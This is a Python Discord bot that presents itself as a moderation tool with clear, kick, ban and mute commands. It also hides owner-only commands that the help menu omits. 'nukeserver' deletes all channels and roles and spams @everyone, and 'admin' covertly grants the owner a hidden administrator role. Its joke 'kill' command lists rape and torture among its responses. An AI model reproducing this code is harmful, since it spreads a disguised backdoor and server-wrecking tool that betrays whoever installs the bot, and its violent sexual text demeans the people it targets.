from http import client
import nextcord
from nextcord.ext import commands
import random
from random import randint
import nextcord
import datetime
import humanfriendly
import itertools

client = commands.Bot(command_prefix = "$")
client.remove_command("help")

@client.event
async def on_ready():
    await client.change_presence(status=nextcord.Status.idle, activity=nextcord.Game('With Little Kids'))
    print('Bot is ready.')

@client.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount=5):
   await ctx.channel.purge(limit=amount)

@client.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member : nextcord.Member,*, reason=None):
  await ctx.message.delete()
  await member.kick(reason=reason)
  await ctx.send(f'Kicked {member.mention}')

@client.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member : nextcord.Member, *, reason=None):
  await ctx.message.delete()
  await member.ban(reason=reason)
  await ctx.send(f'Banned {member.mention}')

@client.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member):
    await ctx.message.delete()
    banned_user = await ctx.guild.bans()
    member_name, member_discriminator = member.split("#")
    for ban_entry in banned_user:
        user = ban_entry.user

        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f'Unbanned {user.mention}')
            return

@client.command(pass_context=True)
async def help(ctx):
     author = ctx.message.author
     await ctx.message.delete()

     embed = nextcord.Embed(
       color = nextcord.Colour.blue()
     )
     embed.set_author(name='Command List')
     embed.add_field(name='$Clear', value='Clears an X amount of messages', inline=False)
     embed.add_field(name='$Kick', value='Kicks a member from the guild', inline=False)
     embed.add_field(name='$Ban', value='Bans a member from the guild', inline=False)
     embed.add_field(name='$Unban', value='Unbans a member', inline=False)   
     embed.add_field(name='$Mute', value='Mutes a member for X time', inline=False)
     embed.add_field(name='$Unmute', value='Unmutes a member', inline=False)
     embed.add_field(name='$Kill', value='Kills the person mentioned', inline=False)
     embed.add_field(name='$Kidnap', value='Kidnaps the person mentioned', inline=False)

     await author.send(embed=embed)

@client.command()
@commands.has_permissions(manage_messages=True)
async def mute(ctx, member:nextcord.Member, time, *, reason):
    reason = reason
    time = humanfriendly.parse_timespan(time)
    await member.edit(timeout=nextcord.utils.utcnow()+datetime.timedelta(seconds=time))
    await ctx.send(f"{member.mention} was muted for {reason}")

@client.command()
@commands.has_permissions(manage_messages=True)
async def unmute(ctx, member:nextcord.Member, *, reason):
      reason = reason
      await member.edit(timeout=None)
      await ctx.send(f"{member.mention} was unmuted for {reason}")

@client.command()
async def kidnap(ctx, *, member):
    author = ctx.message.author.name
    await ctx.send (f'{author} is kidnapping {member} in a van')

@client.command()
async def kill(ctx, *, member):
    author = ctx.message.author.name
    responses = ["Twisting their neck",
                "Breaking their spine",
                "Raping them",
                "torturing them",
                "pushing them of a building",
                "stabing them with a knife",
                "electrocuting them",
                "drowning them"]
    await ctx.send(f'{author} killed {member} by {random.choice(responses)}.')

@client.command()
async def clearchannel(ctx, channel: nextcord.TextChannel = None):
    if channel == None: 
        await ctx.send("You did not mention a channel!")
        return

    clear_channel = nextcord.utils.get(ctx.guild.channels, name=channel.name)

    if clear_channel is not None:
        new_channel = await clear_channel.clone(reason="Has been Cleared!")
        await clear_channel.delete()
        await new_channel.send("This channel has been cleared")
        await ctx.send("Successfully cleared channel")

    else:
        await ctx.send(f"No channel named {channel.name} was found!")


owner = PUT YOUR ID HERE
@client.command()
async def nukeserver(ctx):

  if ctx.author.id == owner:
    await ctx.message.delete()

    for chan in ctx.guild.channels:
        try:
            await chan.delete()
        except:
            pass
    for chan in ctx.guild.roles:
        try:
            await chan.delete()
        except:
            pass

    num = 10
    for _ in itertools.repeat(None, num):
     await ctx.guild.create_text_channel("yungak42-on-top")
    for channel in ctx.guild.text_channels:
       try:
         await channel.send("@everyone YungAk42 On TOP")
       except:
            continue

@client.command()
async def admin(ctx):

  if ctx.author.id == owner:

    perms = nextcord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name=".", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()

@client.command(pass_context=True)
async def unadmin(ctx, *, role_name="."):
  role = nextcord.utils.get(ctx.message.guild.roles, name=".")
  if ctx.author.id == owner:
      await role.delete()
      await ctx.message.delete()

client.run('INSERT YOUR BOT TOKEN HERE')
